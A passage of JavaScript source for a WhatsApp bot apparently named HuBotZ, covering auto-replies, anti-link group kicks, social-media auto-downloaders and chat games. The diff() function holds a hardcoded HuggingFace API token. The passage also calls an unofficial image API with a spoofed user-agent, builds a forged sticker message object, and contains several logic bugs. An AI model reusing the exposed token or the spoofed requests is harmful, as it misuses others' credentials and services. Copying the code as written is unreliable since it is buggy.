fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function getPosiCmdUser(sender, _db) {
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].jid === sender) {
posi = i
}
})
return posi
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

// Store
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
HuBotZ.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
HuBotZ.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
const sendFileFromUrl = async (from, url, caption, mek, men) => {
let mime = '';
let res = await axios.head(url)
mime = res.headers['content-type']
if (mime.split("/")[1] === "gif") {
return HuBotZ.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, gifPlayback: true, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
let type = mime.split("/")[0]+"Message"
if(mime === "application/pdf"){
return HuBotZ.sendMessage(m.chat, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, mentions: men ? men : []}, {quoted: m })
}
if(mime.split("/")[0] === "image"){
return HuBotZ.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
}
if(mime.split("/")[0] === "video"){
return HuBotZ.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
if(mime.split("/")[0] === "audio"){
return HuBotZ.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
}
}
// Auto Read & Presence Online
if (!m.key.fromMe && global.autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await HuBotZ.readMessages([readkey]);
}

HuBotZ.sendPresenceUpdate('available', from)

// Auto Registrasi
if (isCmd && !isUser) {
users.push(m.sender)
fs.writeFileSync('./database/user.json', JSON.stringify(users, null, 2))
}


// Auto Block +212
if (m.sender.startsWith('212') && global.autoblok212 === true) {
return HuBotZ.updateBlockStatus(m.sender, 'block')
}

//Auto SimSimi :V
if (!m.isGroup && !m.key.fromMe && global.autorespond && !isCmd) {
simi = await fetchJson(`https://api.simsimi.net/v2/?lc=id&cf=false&text=${command}`)
m.reply('_' + simi.success +'_') 
}

if (!m.isGroup && (isAutoAiPc || global.auto_ai_japri) && !isCmd) {
        let text = m.text;
/*        try {
            const openAIResponse = await fetchChatData('chat', text)
            const result = openAIResponse;
            let str = ""
            let anu = result.split('data: ').slice(1).map(x => (str += x.replace(/\n/g, '')))

            if (result) {
                await HuBotZ.sendMessage(m.chat, {
                    text: str.replace(/\\n/g, '\n')
                }, {
                    quoted: m
                });
            }*/
//        } catch (er) {
        try {
            const openAiResponses = await chatgpt(text)
            const result = openAiResponses;

            if (result.status === true) {
                await HuBotZ.sendMessage(m.chat, {
                    text: result.result
                }, {
                    quoted: m
                });
            }
    } catch (e) {
    console.log(e)
        m.reply('Error occurred. . .\nNotify this error to the owner');
    }
//}
}
if (m.isGroup && (isAutoAiGc || global.auto_ai_grup) && !isCmd) {
/*try {
const configuration = new Configuration({
apiKey: global.OpenAIKey,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createChatCompletion({
model: "gpt-3.5-turbo",
messages: [{role: "user", content: m.text}],
});
newReply(`${response.data.choices[0].message.content}`);
} catch (err) {
console.log(err);
newReply("Upss error silahkan hubungi owner agar di fix")
//newReply(JSON.stringify(err));
}*/
        let text = m.text;
/*        try {
            const openAIResponse = await fetchChatData('chat', text)
            const result = openAIResponse;
            let str = ""
            let anu = result.split('data: ').slice(1).map(x => (str += x.replace(/\n/g, '')))

            if (result) {
                await HuBotZ.sendMessage(m.chat, {
                    text: str.replace(/\\n/g, '\n')
                }, {
                    quoted: m
                });
            }*/
//        } catch (er) {
        try {
            const openAiResponses = await chatgpt(text)
            const result = openAiResponses;

            if (result.status === true) {
                await HuBotZ.sendMessage(m.chat, {
                    text: result.result
                }, {
                    quoted: m
                });
            }
    } catch (e) {
    console.log(e)
        m.reply('Error occurred. . .\nNotify this error to the owner');
    }
//}
}
//========== [ A N T I L I N K ] ==========\\
if (isAntiLink) {
if (budy.match(`chat.whatsapp.com`)) {
newReply(`*「 LINK GRUP TERDETEKSI 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
let gclink = (`https://chat.whatsapp.com/`+await HuBotZ.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return newReply(`Gajadi, Karena Lu ngirim link group ini`)
if (isAdmins) return newReply(`Gajadi, Lu Admin :V`)
if (isCreator) return newReply(`Gajadi, Lu Owner :V`)
await HuBotZ.sendMessage(m.chat, { delete: m.key })
await HuBotZ.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
HuBotZ.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
if (isAntiLink2) {
if (budy.match(`tiktok.com`)) {
newReply(`*「 LINK TIKTOK TERDETEKSI 」*\n\nSepertinya kamu mengirimkan link tiktok, maaf kamu akan di kick`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
if (isAdmins) return newReply(`Gajadi, Lu Admin :V`)
if (isCreator) return newReply(`Gajadi, Lu Owner :V`)
await HuBotZ.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
HuBotZ.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

// Kick Me
if (isKickMe) {
if (budy.match(`in kel`)) {
await newReply(`Siap Laksanakan`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
if (isAdmins) return newReply(`Kenapa Mau Out Sayang🥺`)
if (isCreator) return newReply(`Kenapa Mau Out Sayang🥺`)
newReply(`Done Awokwok`) 
HuBotZ.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

//========= [ M U T E ] ==========\\
if (m.isGroup && isMute) {
if (!isAdmins && !isCreator) return
}

// Anti Wame
if (isAntiWame) {
if (budy.match(`wa.me` && `Wa.me`)) {
newReply(`*「 WA ME DETECTOR 」*\n\nSepertinya kamu mengirimkan link Whatsapp, maaf kamu akan di kick`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
await HuBotZ.sendMessage(m.chat, { delete: m.key })
if (isAdmins) return newReply(`Gajadi, Kamu admin`)
if (isCreator) return newReply(`Gajadi, Kamu ownerku`)
await HuBotZ.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
HuBotZ.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
if (m.isGroup && isAntiWame2 && !isCreator && !isAdmins && isBotAdmins){
if (budy.match(`wa.me`)){
if (!isBotAdmins) return //newReply(`Untung bot bukan admin`)
await HuBotZ.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

//Auto Download Tiktok
if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/') && (isAutoDownTT || global.auto_down_tt)) {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
const link = encodeURIComponent(budy);
    const apiUrl = `https://api.botzaku.com/download/tiktok?url=${link}&apikey=${global.botzAku}`;
    await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⌛',
        key: m.key,
    }})
    let old = new Date();
    db.data.users[m.sender].limit -= 1
    try {
        const response = await fetchJson(apiUrl);
        const data = response.result;       
        if (data && data.images && data.images.length > 0) {
            for (const image of data.images) {
                await HuBotZ.sendMessage(m.chat, {
                    image: { url: image.url },
                    caption: `*RestApi* : api.botzaku.com\n\n> *Author* : ${data.author.name}\n> *Create at* : ${data.created_at}\n> *Likes* : ${data.stats.likeCount}\n> *Comments* : ${data.stats.commentCount}\n> *Shares* : ${data.stats.shareCount}\n> *Plays :* ${data.stats.playCount}\n> *Saves* : ${data.stats.saveCount}\n\n*Fetching Time* : ${((new Date - old) * 1)} ms`
                }, { quoted: m });
            }
        }
        if (data && data.video && data.video.noWatermark) {
            await HuBotZ.sendMessage(m.chat, {
                video: { url: data.video.noWatermark },
                caption: `*RestApi* : api.botzaku.com\n\n> *Author* : ${data.author.name}\n> *Create at* : ${data.created_at}\n> *Likes* : ${data.stats.likeCount}\n> *Comments* : ${data.stats.commentCount}\n> *Shares* : ${data.stats.shareCount}\n> *Plays :* ${data.stats.playCount}\n> *Saves* : ${data.stats.saveCount}\n\n*Fetching Time* : ${((new Date - old) * 1)} ms`
            }, { quoted: m });
        }
        if (data && data.music && data.music.play_url) {
            await HuBotZ.sendMessage(m.chat, {
                audio: { url: data.music.play_url }, mimetype: 'audio/mp4', fileName: `${data.author.name}.mp4` }, { quoted: m });
        }
        await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'✅',
        key: m.key,
    }})
    } catch (error) {
        console.error('Error saat memanggil API TikTok:', error);
        await HuBotZ.sendMessage(m.chat, {
            react: {
                text:'❌',
            key: m.key,
        }})
        db.data.users[m.sender].limit += 1
    }
}

//Auto Download Yt
if (budy.startsWith('https://youtube.com/') || budy.startsWith('https://youtu.be/') && (isAutoDownYt || global.auto_down_yt)) {
if (!isPremium && db.data.users[m.sender].limit < 2) return m.reply(`${mess.KurangLimit}`)
const { youtubeSearch, youtubedl, youtubedlv2 } = require("@bochilteam/scraper-sosmed");
const vidoh = require("./lib/ytdl2");
const yts = require("yt-search");
const ytdl = require("ytdl-core");
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⌛',
        key: m.key,
    }})
db.data.users[m.sender].limit -= 2
try {
const vid = await vidoh.mp4(budy)
const ytc = `
≡  *Youtube Downloader*
  
▢ *📌 Títle* : ${vid.title}
▢ *📅 Date* : ${vid.date}
▢ *🎞️ Quality* : ${vid.quality}
▢ *⏱️ Duration* : ${vid.duration}
▢ *📟 Ext* : mp4

🇺🇸 Please wait, audio is being sent. . .
🇮🇩 Mohon tunggu, audio sedang dikirim. . .`

const ytplmp4 = await HuBotZ.sendMessage(m.chat, {
video: {
url: vid.videoUrl
},
caption: ytc
}, { quoted: m });
/*    let puki = await youtubeSearch(budy)
    puki = puki.video[0]
    let url = puki.url
    let res = await youtubedl(budy)
	let data = res.audio[Object.keys(res.audio)[0]]
	let site = await data.download()
	await HuBotZ.sendMessage(m.chat, {
    audio: {
    url: site
    },
    mimetype: 'audio/mpeg'
}, { quoted: m })*/
/*const HuBotZplaymp3 = require('./lib/ytdl2');
const pl = await HuBotZplaymp3.mp3(budy);
await HuBotZ.sendMessage(m.chat, {
    audio: fs.readFileSync(pl.path),
    mimetype: 'audio/mpeg'
}, { quoted: vidnya })
fs.unlinkSync(pl.path)*/
let puki = await ytdl.getURLVideoID(budy)
let pepek = await ytdl.getInfo(puki)
let pukima = pepek.videoDetails
pepek = pepek.formats.filter(v => v.mimeType.includes('audio/mp4'))[0]
    HuBotZ.sendMessage(m.chat, {
    audio: {
    url: pepek.url
    },
    mimetype: 'audio/mpeg'
}, { quoted: ytplmp4 })

/*let urlaudionya = `https://aemt.me/youtube?url=${budy}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`
await HuBotZ.sendMessage(m.chat, {
    audio: {
    url: urlaudionya
    },
    mimetype: 'audio/mpeg'
}, { quoted: m })*/
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'✅',
        key: m.key,
    }})
} catch (er) {
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'❌',
        key: m.key,
    }})
console.log(er)
db.data.users[m.sender].limit += 2
}
}

//Auto Download FB
if (budy.startsWith('https://www.facebook.com/') && (isAutoDownFb || global.auto_down_fb)) {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
const { facebook } = require("@xct007/frieren-scraper");
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⌛',
        key: m.key,
    }})
db.data.users[m.sender].limit -= 1
try {
let result = await facebook.v1(budy)
let jadi = result.urls[0].hd ? result.urls[0].hd : (result.urls[1].sd ? result.urls[1].sd : giflogo)
let caption = `*[ F A C E B O O K ]*

*Title:* ${result.title}
*Quality:* ${result.isHdAvailable}
`
HuBotZ.sendFile(m.chat, Buffer.from(jadi, 'base64'), "", caption, m)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'✅',
        key: m.key,
    }})
} catch (e) {
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'❌',
        key: m.key,
    }})
console.log(e)
db.data.users[m.sender].limit += 1
}
}

//Auto Download IG
if (budy.startsWith("https://www.instagram.com/reel/") || budy.startsWith('https://www.instagram.com/p/') && (isAutoDownIG || global.auto_down_ig)) {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
const { instagram } = require("@xct007/frieren-scraper");
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⌛',
        key: m.key,
    }})
db.data.users[m.sender].limit -= 1
try {
let results = await instagram(budy)
let caption = `*[ I N S T A G R A M ]*`
let out = results[0].url
await HuBotZ.sendFile(m.chat, Buffer.from(out, 'base64'), "", caption, m)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'✅',
        key: m.key,
    }})
} catch (e) {
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'❌',
        key: m.key,
    }})
console.log(e)
db.data.users[m.sender].limit += 1
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
let hash = db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: HuBotZ.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, HuBotZ.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
HuBotZ.ev.emit('messages.upsert', msg)
}
async function newReply(teks) {
      const nedd = {
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            showAdAttribution: true,
            title: `${pushname}`,
            body: `${jam}`,
            previewType: "PHOTO",
            thumbnailUrl: global.thumb, 
            sourceUrl: global.wagc,
          },
        },
        text: teks,
      };
      return HuBotZ.sendMessage(m.chat, nedd, {
        quoted: m,
      });
    }
    async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function jarak(dari, ke) {
	let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
	let $ = cheerio.load(html), obj = {}
	let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	return obj
}
async function diff(data) {
	const response = await fetch(
		"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await response.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
}
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	})
}
//Edit Message//
    async function replyLoad() {
    let { key } = await HuBotZ.sendMessage(m.chat, {text: 'Mohon Tunggu. . .'}, { qouted: m });
    var message = [
        '1 Limit Terpakai',
        '○ S',
        '● Se',
        '○ Sea',
        '● Sear',
        '○ Searc',
        '● Search',
        '○ Searchi',
        '● Searchin',
        '○ Searching'
];
for (let i = 0; i < message.length; i++) {
await HuBotZ.sendMessage(m.chat, {text: message[i], edit: key });
}
let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
}

    async function replyLoad1() {
    let { key } = await HuBotZ.sendMessage(m.chat, {text: 'Please wait. . .'}, {qouted: m});
    var message = [
        '◇ G',
        '◆ Ge',
        '◇ Gen',
        '◆ Gene',
        '◇ Gener',
        '◆ Genera',
        '◇ Generat',
        '◆ Generati',
        '◇ Generatin',
        '◆ Generating',
        'Sending Response. . .'
];
for (let i = 0; i < message.length; i++) {
await HuBotZ.sendMessage(m.chat, {text: message[i], edit: key })
}
}

    async function replyLoad2() {
    let { key } = await HuBotZ.sendMessage(m.chat, {text: 'Please wait. . .'}, {qouted: m});
    var message = [
        '1 Limit Terpakai',
        '■ S',
        '□ Se',
        '■ Sea',
        '□ Sear',
        '■ Searc',
        '□ Search',
        '■ Searchi',
        '□ Searchin',
        '■ Searching',
        '□ Searching A',
        '■ Searching An',
        '□ Searching Ans',
        '■ Searching Answ',
        '□ Searching Answe',
        '■ Searching Answer',
        '□ Searching Answers',
];
for (let i = 0; i < message.length; i++) {
await HuBotZ.sendMessage(m.chat, {text: message[i], edit: key })
}
let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
}

    async function replyLoad3() {
    let { key } = await HuBotZ.sendMessage(m.chat, {text: 'Please wait. . .'}, {qouted: m});
    var message = [
        '1 Used Limit',
        '◓ S',
        '◑ Se',
        '◒ Sea',
        '◐ Sear',
        '◓ Searc',
        '◑ Search',
        '◒ Searchi',
        '◐ Searchin',
        '◓ Searching',
        '◑ Searching D',
        '◒ Searching Da',
        '◐ Searching Dat',
        '◓ Searching Data',
        'Sending Response. . .'
];
for (let i = 0; i < message.length; i++) {
await HuBotZ.sendMessage(m.chat, {text: message[i], edit: key })
}
}

    async function replyLoad4() {
    let { key } = await HuBotZ.sendMessage(m.chat, {text: 'Please wait. . .'}, {qouted: m});
    var message = [
        '1 Used Limit',
        '◓ C',
        '◑ Cr',
        '◒ Cre',
        '◐ Crea', 
        '◓ Creat', 
        '◑ Creati', 
        '◒ Creatin', 
        '◐ Creating', 
        'Sending Response. . .'
];
for (let i = 0; i < message.length; i++) {
await HuBotZ.sendMessage(m.chat, {text: message[i], edit: key })
}
}

    async function replyLoad5() {
    let response = await fetchJson(`https://api.akuari.my.id/randomtext/faktaunik`)
    let teksid = `Tahukah Kamu ?\n${response.hasil}`
    let translatedResponse = await translate(teksid, { to: 'en' });
    let { key } = await HuBotZ.sendMessage(m.chat, { text: `🇺🇸 ${translatedResponse.text}\n\n🇮🇩 ${teksid}`}, {quoted: m});
    await sleep(5000)
    var message = [
        'This Is Hu~BotZ The Next Generation WhatsApp Bot\nWith Using Node JS'
];
    for (let i = 0; i < message.length; i++) {
        await HuBotZ.sendMessage(m.chat, { text: message[i], edit: key })
}
}

const HuBotzZ = {
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(m.chat ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// newReply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await HuBotZ.sendText(room.x, str, m, { mentions: parseMention(str) } )
await HuBotZ.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

if (fs.existsSync(`./database/casino/${m.chat}.json`)) {
var casinoo = setCasino(`${m.chat}`)
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'n') {
HuBotZ.sendMessage(m.chat, { text: `*「 Game Casino Rejected 」*\n\n• @${casinoo.Y.split("@")[0]} Membatalkan Game`, mentions: [casinoo.Y] }, {quoted: m })
deleteCasino(m.chat)
}
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'y') {
var angka1 = await randomNomor(10, 20)
var angka2 = await randomNomor(10, 20)
if (angka1 > angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenangnya adalah [ @${casinoo.Z} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
HuBotZ.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, {quoted: m })
db.data.users[`${casinoo.Z}@s.whatsapp.net`].money += nebal(casinoo.nominal)
db.data.users[`${casinoo.Y}`].money -= nebal(casinoo.nominal)
deleteCasino(m.chat)
} else if (angka1 < angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenangnya adalah [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
HuBotZ.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y] }, {quoted: m })
db.data.users[`${casinoo.Y}`].money += nebal(casinoo.nominal)
db.data.users[`${casinoo.Z}@s.whatsapp.net`].money -= nebal(casinoo.nominal)
deleteCasino(m.chat)
} else if (angka1 = angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Games Draw, Tidak Ada Pemenang`
HuBotZ.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, { quoted: m })
deleteCasino(m.chat)
}
}
}

const JwbTrue = (tebak, exp) => {
return`🎮 ${tebak} 🎮\n\nJawaban Benar 🎉\n+Rp.${exp} balance`
}
const waktuHabis = (jawaban) => {
return `Waktu Habis\nJawaban: ${jawaban}`
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
 kuis = true
 jawaban = kuismath[m.sender.split('@')[0]][0]
 hadiah = kuismath[m.sender.split('@')[0]][1]
 if (budy.toLowerCase() == jawaban) {
m.reply(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\n+$${hadiah} Balance` + `\n\nKirim perintah *${prefix}math* untuk bermain lagi 🎮`)
db.data.users[m.sender].money += hadiah
delete kuismath[m.sender.split('@')[0]]
 } else m.reply("❌ Jawaban salah")
}
if (('family100' + m.chat in _family100) && !isCmd) {
 kuis = true
let room = _family100['family100' + m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
 if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
 }
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : ``}`.trim()
 HuBotZ.sendTextWithMentions(m.chat, caption, m)
.then(mes => {
return _family100['family100' + m.chat].pesan = mesg
}).catch(_ => _)
 if (isWin || isSurender) delete _family100['family100' + m.chat]
}
if (tebakgame[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakgame[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
db.data.users[m.sender].money += tebakgame[m.chat][2]
